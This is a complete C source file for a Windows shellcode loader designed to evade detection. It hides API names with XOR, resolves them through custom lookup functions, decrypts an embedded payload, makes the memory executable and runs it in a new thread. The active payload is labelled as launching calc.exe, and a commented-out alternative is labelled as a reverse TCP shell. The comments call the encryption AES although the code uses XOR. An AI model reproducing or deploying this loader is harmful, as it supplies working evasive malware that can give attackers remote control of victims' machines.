#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "CustomFuncs.h"

/*------[INSTRUCT THE LINKER TO CONSIDER "WinMain" FUNCTION AS THE ENTRYPOINT]------*/
#pragma comment(linker, "/entry:WinMain")

/*------[DEFINE A TYPEDEF FOR A POINTER TO THE FUNCTIONS USED IN WINDOWS API]------*/
typedef LPVOID (WINAPI * VirtualAlloc_DT)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
typedef BOOL (WINAPI * VirtualProtect_DT)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);
typedef VOID (WINAPI * RtlMoveMemory_DT)(VOID UNALIGNED *Destination, const VOID UNALIGNED *Source, SIZE_T Length);
typedef HANDLE (WINAPI * CreateThread_DT)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE  lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
typedef DWORD (WINAPI * WaitForSingleObject_DT)(HANDLE hHandle, DWORD dwMilliseconds);


/*------[XOR FUNCTION]------*/
void xorAPIs(char *data, const char *key, size_t data_len, size_t key_len) {

    size_t i;
    for (i = 0; i < data_len; i++) {
        data[i] ^= key[i % key_len];
    }
}

VOID XorShellcode(PBYTE pShellcode, SIZE_T sShellcodeSize, PBYTE Key, SIZE_T sKeySize) {
    for (size_t i=0, j=0; i < sShellcodeSize; i++, j++) {
        if (j > sKeySize) {
            j = 0;   // Reset 'j'
        }
        pShellcode[i] ^= Key[j];
    }
}

// int main(void) {
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {

    /*------[ENCRYPTED API CALLS]------*/
    unsigned char sVAlloc[] = {0x0f, 0x33, 0x33, 0x2c, 0x34, 0x38, 0x2d, 0x1b, 0x19, 0x1f, 0x0a, 0x11, 0x33};
    unsigned char sVProt[] = {0x0f, 0x33, 0x33, 0x2c, 0x34, 0x38, 0x2d, 0x0a, 0x07, 0x1c, 0x11, 0x17, 0x50, 0x46, 0x2e};
    unsigned char sRMV[] = {0x0b, 0x2e, 0x2d, 0x15, 0x2e, 0x2f, 0x24, 0x17, 0x10, 0x1e, 0x0a, 0x00, 0x4a, 0x32};
    unsigned char sCT[] = {0x1a, 0x28, 0x24, 0x39, 0x35, 0x3c, 0x15, 0x32, 0x07, 0x16, 0x04, 0x16, 0x33};
    unsigned char sWFSO[] = {0x0e, 0x3b, 0x28, 0x2c, 0x07, 0x36, 0x33, 0x09, 0x1c, 0x1d, 0x02, 0x1e, 0x56, 0x7d, 0x4c, 0x0e, 0x09, 0x0f, 0x3c, 0x58};

    /*------[AES ENCRYPTED SHELLCODE + ENCRYPTION KEY & THEIR LENGTHS]------*/
        // calc.exe encrypted shellcode //
    unsigned char shellcode[] = {0xa5, 0x12, 0xc2, 0xbc, 0xb1, 0xb1, 0x81, 0x5a, 0x75, 0x73, 0x24, 0x23, 0x72, 0x62, 0x7c, 0x35, 0x3a, 0x24, 0x79, 0x8a, 0x24, 0x11, 0xd1, 0x6c, 0x28, 0x48, 0xd2, 0x08, 0x59, 0x10, 0xca, 0x0b, 0x61, 0x12, 0xfe, 0x01, 0x35, 0x3a, 0x3c, 0x85, 0x64, 0x2e, 0x21, 0x5d, 0x81, 0x10, 0x70, 0x99, 0xf6, 0x02, 0x29, 0x7c, 0x5b, 0x76, 0x61, 0x19, 0x80, 0x90, 0x4c, 0x1b, 0x74, 0xb2, 0x87, 0x9f, 0x61, 0x73, 0x7f, 0x2c, 0xe7, 0x3e, 0x68, 0xd3, 0x03, 0x65, 0x12, 0x3f, 0x98, 0x8b, 0xd9, 0xd2, 0x41, 0x58, 0x41, 0x11, 0xc4, 0x9a, 0x01, 0x14, 0x2d, 0x73, 0xe3, 0x62, 0xa5, 0x2c, 0x74, 0x28, 0xc3, 0x18, 0x61, 0x10, 0x5b, 0xee, 0xab, 0x56, 0x11, 0xa5, 0x88, 0x19, 0xca, 0x6d, 0xc9, 0x12, 0x74, 0xa5, 0x28, 0x43, 0xfa, 0x7a, 0x1f, 0xa4, 0xc0, 0x2d, 0x89, 0x91, 0x4c, 0x18, 0x5b, 0xff, 0x70, 0xe0, 0x2c, 0xab, 0x0d, 0x5b, 0x0d, 0x7d, 0x49, 0x1f, 0x4c, 0xa2, 0x10, 0xaa, 0x6b, 0x76, 0xa5, 0x24, 0x48, 0x25, 0x49, 0x88, 0x27, 0x18, 0xd1, 0x32, 0x00, 0x44, 0xd2, 0x1a, 0x5d, 0x11, 0x40, 0x89, 0x00, 0xd1, 0x71, 0xfb, 0x2d, 0x73, 0xe3, 0x73, 0x76, 0x25, 0x34, 0x32, 0x11, 0x02, 0x00, 0x01, 0x1b, 0x67, 0x09, 0x5a, 0x11, 0xd9, 0xad, 0x78, 0x00, 0x0b, 0xbe, 0xba, 0x2d, 0x32, 0x3c, 0x28, 0x7b, 0xb9, 0x3c, 0x8d, 0x3b, 0x93, 0xb7, 0xa7, 0x1c, 0x11, 0xe0, 0x3f, 0x48, 0x00, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x11, 0xcc, 0xd7, 0x74, 0x72, 0x65, 0x72, 0x72, 0x88, 0x1f, 0xef, 0x03, 0xeb, 0xb7, 0x8d, 0xfa, 0xa9, 0xef, 0x9c, 0x1e, 0x41, 0xe3, 0xfc, 0xd4, 0xe5, 0xdc, 0xa6, 0x94, 0x12, 0xf6, 0xb7, 0x4d, 0x4e, 0x35, 0x4e, 0x24, 0xe4, 0x97, 0x8c, 0x3d, 0x5d, 0xfa, 0x1e, 0x49, 0x4c, 0x27, 0x6a, 0x59, 0x03, 0x00, 0xd1, 0x9b, 0xa6, 0x94, 0x39, 0x14, 0x1f, 0x06, 0x5c, 0x56, 0x4a, 0x4b, 0x64, 0x6c};
    
        // shell_reverse_tcp encrypted shellcode //
    // unsigned char shellcode[] = {0xa5, 0x12, 0xc2, 0xbc, 0xb1, 0xb1, 0x81, 0x5a, 0x75, 0x73, 0x24, 0x23, 0x72, 0x62, 0x7c, 0x35, 0x3a, 0x24, 0x79, 0x8a, 0x24, 0x11, 0xd1, 0x6c, 0x28, 0x48, 0xd2, 0x08, 0x59, 0x10, 0xca, 0x0b, 0x61, 0x12, 0xfe, 0x01, 0x35, 0x3a, 0x3c, 0x85, 0x64, 0x2e, 0x21, 0x5d, 0x81, 0x10, 0x70, 0x99, 0xf6, 0x02, 0x29, 0x7c, 0x5b, 0x76, 0x61, 0x19, 0x80, 0x90, 0x4c, 0x1b, 0x74, 0xb2, 0x87, 0x9f, 0x61, 0x73, 0x7f, 0x2c, 0xe7, 0x3e, 0x68, 0xd3, 0x03, 0x65, 0x12, 0x3f, 0x98, 0x8b, 0xd9, 0xd2, 0x41, 0x58, 0x41, 0x11, 0xc4, 0x9a, 0x01, 0x14, 0x2d, 0x73, 0xe3, 0x62, 0xa5, 0x2c, 0x74, 0x28, 0xc3, 0x18, 0x61, 0x10, 0x5b, 0xee, 0xab, 0x56, 0x11, 0xa5, 0x88, 0x19, 0xca, 0x6d, 0xc9, 0x12, 0x74, 0xa5, 0x28, 0x43, 0xfa, 0x7a, 0x1f, 0xa4, 0xc0, 0x2d, 0x89, 0x91, 0x4c, 0x18, 0x5b, 0xff, 0x70, 0xe0, 0x2c, 0xab, 0x0d, 0x5b, 0x0d, 0x7d, 0x49, 0x1f, 0x4c, 0xa2, 0x10, 0xaa, 0x6b, 0x76, 0xa5, 0x24, 0x48, 0x25, 0x49, 0x88, 0x27, 0x18, 0xd1, 0x32, 0x00, 0x44, 0xd2, 0x1a, 0x5d, 0x11, 0x40, 0x89, 0x00, 0xd1, 0x71, 0xfb, 0x2d, 0x73, 0xe3, 0x73, 0x76, 0x25, 0x34, 0x32, 0x11, 0x02, 0x00, 0x01, 0x1b, 0x67, 0x09, 0x5a, 0x11, 0xd9, 0xad, 0x78, 0x00, 0x0b, 0xbe, 0xba, 0x2d, 0x32, 0x3c, 0x28, 0x7b, 0xb9, 0x3c, 0x8d, 0x3b, 0x93, 0xb7, 0xa7, 0x1c, 0x10, 0xe4, 0x49, 0x3b, 0x32, 0x06, 0x69, 0x73, 0x58, 0x41, 0x18, 0x17, 0x13, 0xfc, 0x95, 0x2d, 0xf3, 0xdf, 0x92, 0x2f, 0x64, 0x6c, 0x25, 0xc1, 0xbd, 0x08, 0xe5, 0x58, 0x3e, 0x5d, 0xb3, 0x99, 0xf2, 0x6d, 0xd8, 0x00, 0x0d, 0x08, 0xd3, 0x91, 0x3f, 0xec, 0x83, 0x72, 0x88, 0x62, 0x13, 0x4a, 0x6b, 0xb7, 0x8d, 0x0d, 0xd0, 0xb0, 0x56, 0x49, 0x01, 0x59, 0x5a, 0x18, 0x19, 0xfb, 0x70, 0xc1, 0x31, 0x75, 0x8c, 0xb0, 0x22, 0x63, 0x7f, 0x1f, 0xad, 0x21, 0x5d, 0x88, 0x10, 0xbe, 0x99, 0x12, 0xb7, 0x8a, 0x48, 0xa6, 0x9a, 0x09, 0xd1, 0x80, 0x18, 0xfb, 0xb0, 0x7a, 0xac, 0x85, 0x8d, 0xe6, 0x7a, 0xa7, 0xa3, 0x06, 0x7c, 0x09, 0x00, 0x0d, 0xd0, 0xb8, 0x76, 0xc1, 0xf9, 0x18, 0xe0, 0xd8, 0xfd, 0x35, 0x38, 0xbe, 0x8f, 0x3d, 0xf2, 0xa1, 0x32, 0x31, 0x32, 0x2e, 0x2d, 0xd4, 0x0f, 0x25, 0x3c, 0x41, 0x59, 0x5a, 0x3e, 0x48, 0x41, 0x09, 0x1b, 0x11, 0x10, 0xc8, 0xbb, 0x16, 0x0d, 0x22, 0x3e, 0x54, 0xb2, 0x59, 0x3f, 0x77, 0x25, 0x3c, 0x8e, 0xb4, 0x3e, 0x86, 0x1d, 0x7e, 0x6a, 0x49, 0x01, 0x11, 0xd7, 0x05, 0x7c, 0x59, 0x9f, 0x41, 0x32, 0x3d, 0xfa, 0x83, 0x24, 0x63, 0x73, 0x7e, 0x25, 0x3c, 0x2d, 0x18, 0x11, 0xbe, 0x99, 0x1b, 0x6e, 0x01, 0xff, 0x91, 0x17, 0xc8, 0x99, 0x0d, 0xd0, 0x80, 0x1b, 0xcf, 0x0a, 0xa9, 0x4d, 0xb5, 0xcd, 0xfb, 0x2c, 0x5d, 0xbe, 0x00, 0xa7, 0x8b, 0xd2, 0x54, 0x7f, 0xf2, 0x08, 0xde, 0x47, 0x21, 0xa7, 0x94, 0xe2, 0xb1, 0xef, 0xd7, 0x25, 0x24, 0xc8, 0x95, 0xa7, 0x93, 0xf9, 0x93, 0xb9, 0x00, 0xdb, 0x85, 0x71, 0x66, 0x38, 0x34, 0x0a, 0xd9, 0xa1, 0xa1, 0x2d, 0x44, 0xe2, 0x06, 0x49, 0x07, 0x1c, 0x0f, 0x72, 0x6a, 0x73, 0xa7, 0xbe, 0x93, 0xb9, 0x48};


    size_t shellcodeLen = sizeof(shellcode);

    /*------[ENCRYPTION KEY]------*/
    char sk[] = "YZAXAYAZuser32.dllHXAYZ>H";

    /*------[DECRYPTING API FUNCTIONS]------*/
    xorAPIs((char *) sVAlloc, sk, sizeof(sVAlloc), strlen(sk));
    xorAPIs((char *) sVProt, sk, sizeof(sVProt), strlen(sk));
    xorAPIs((char *) sRMV, sk, sizeof(sRMV), strlen(sk));
    xorAPIs((char *) sCT, sk, sizeof(sCT), strlen(sk));
    xorAPIs((char *) sWFSO, sk, sizeof(sWFSO), strlen(sk));

    /*------[DECLARED VARIABLES]------*/
    LPVOID ExecMem;
    BOOL retVP;
    DWORD oldProtect = 0;
    HANDLE hThread;

    /*------[GET ADDRESSES OF API CALLS]------*/
    VirtualAlloc_DT pVirtualAlloc = (VirtualAlloc_DT) CustomGetProcAddress(CustomGetModuleHandle(L"Kernel32.dll"), (char *) sVAlloc);
    VirtualProtect_DT pVirtualProtect = (VirtualProtect_DT) CustomGetProcAddress(CustomGetModuleHandle(L"Kernel32.dll"), (char *) sVProt);
    RtlMoveMemory_DT pRtlMoveMemory = (RtlMoveMemory_DT) CustomGetProcAddress(CustomGetModuleHandle(L"Kernel32.dll"), (char *) sRMV);
    CreateThread_DT pCreateThread = (CreateThread_DT) CustomGetProcAddress(CustomGetModuleHandle(L"Kernel32.dll"), (char *) sCT);
    WaitForSingleObject_DT pWaitForSingleObject = (WaitForSingleObject_DT) CustomGetProcAddress(CustomGetModuleHandle(L"Kernel32.dll"), (char *) sWFSO);

    /*------[ALLOCATE MEMORY BUFFER]------*/
    ExecMem = pVirtualAlloc(0, shellcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    /*------[DECRYPT THE SHELLCODE]------*/
    XorShellcode(shellcode, shellcodeLen, (PBYTE) sk, strlen(sk));

    /*------[WRITE SHELLCODE IN THE ALLOCATED BUFFER]------*/
    pRtlMoveMemory(ExecMem, shellcode, shellcodeLen);

    /*------[CHANGE MEM PROTECTIONS]------*/
    retVP = pVirtualProtect(ExecMem, shellcodeLen, PAGE_EXECUTE_READ, &oldProtect);

    /*------[CREATE A THREAD THAT WILL EXECUTE OUR SHELLCODE]------*/
    if (retVP) {
        hThread = pCreateThread(0, 0, (LPTHREAD_START_ROUTINE) ExecMem, 0, 0, 0);
        pWaitForSingleObject(hThread, -1);
    }

    return 0;
}
